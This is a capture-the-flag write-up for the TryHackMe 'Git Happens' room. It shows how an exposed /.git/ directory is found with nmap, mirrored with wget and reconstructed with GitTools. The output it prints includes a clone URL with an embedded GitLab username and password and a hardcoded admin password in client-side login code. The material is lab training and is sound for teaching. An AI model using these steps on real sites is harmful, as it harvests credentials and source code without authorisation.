# TryHackMe-Git Happens

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 20:16 PKT
Nmap scan report for 10.10.116.239
Host is up (0.16s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.116.239:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.52 seconds

```
## PORT 80

We found `/.git/`

<img src="https://imgur.com/CZXdc27.png"/>

Use wget to recursively download all git files on your local machines so you can view them easily

`wget -r http://10.10.116.239/.git/`

```
2020-11-08 20:29:57 (2.30 MB/s) - ‘10.10.116.239/.git/refs/heads/master’ saved [41/41]                                                              
                                                                                                                                                    
--2020-11-08 20:29:57--  http://10.10.116.239/.git/logs/refs/heads/master                                                                           
Reusing existing connection to 10.10.116.239:80.                                                                                                    
HTTP request sent, awaiting response... 200 OK                                                                                                      
Length: 216 [application/octet-stream]                                                                                                              
Saving to: ‘10.10.116.239/.git/logs/refs/heads/master’                                                                                              
                                                                                                                                                    
10.10.116.239/.git/logs/refs 100%[===========================================>]     216  --.-KB/s    in 0s                                          
                                                                                                                                                    
2020-11-08 20:29:57 (13.0 MB/s) - ‘10.10.116.239/.git/logs/refs/heads/master’ saved [216/216]                                                       
                                                                                                                                                    
FINISHED --2020-11-08 20:29:57--          
``` 

We find somthing interesting 

```
root@kali:~/TryHackMe/Easy/Git Happens/git files/logs# cat HEAD 
0000000000000000000000000000000000000000 d0b3578a628889f38c0affb1b75457146a4678e5 root <root@ubuntu.(none)> 1595543975 +0200    clone: from https://hydragyrum:kMhJnM42EHdTN7MXNWeD@gitlab.com/cfe-atc/seccom/git-fail.git

```

But I can't crack the SHA-1 hash

## GitTools

I then came across gittools that may dump from a remote location and then can extract useful information from the files

### Dumper
<img src="https://imgur.com/8pxycEZ.png"/>

### Extractor
<img src="https://imgur.com/eDinwXb.png"/>

Here we can find `index.html`

```
root@kali:~/TryHackMe/Easy/Git/temp/8-395e087334d613d5e423cdf8f7be27196a360459# ls -al
total 28
drwxr-xr-x  3 root root 4096 Nov  8 21:36 .
drwxr-xr-x 11 root root 4096 Nov  8 21:36 ..
-rw-r--r--  1 root root  241 Nov  8 21:36 commit-meta.txt
drwxr-xr-x  2 root root 4096 Nov  8 21:36 css
-rw-r--r--  1 root root  677 Nov  8 21:36 dashboard.html
-rw-r--r--  1 root root 2667 Nov  8 21:36 index.html
-rw-r--r--  1 root root   54 Nov  8 21:36 README.md
```

And we will get the password

```

   

    <script>
      function login() {
        let form = document.getElementById("login-form");
        console.log(form.elements);
        let username = form.elements["username"].value;
        let password = form.elements["password"].value;
        if (
          username === "admin" &&
          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
        ) {
          document.cookie = "login=1";
          window.location.href = "/dashboard.html";
        } else {
          document.getElementById("error").innerHTML =
            "INVALID USERNAME OR PASSWORD!";
        }
      }
    </script>
  </body>

```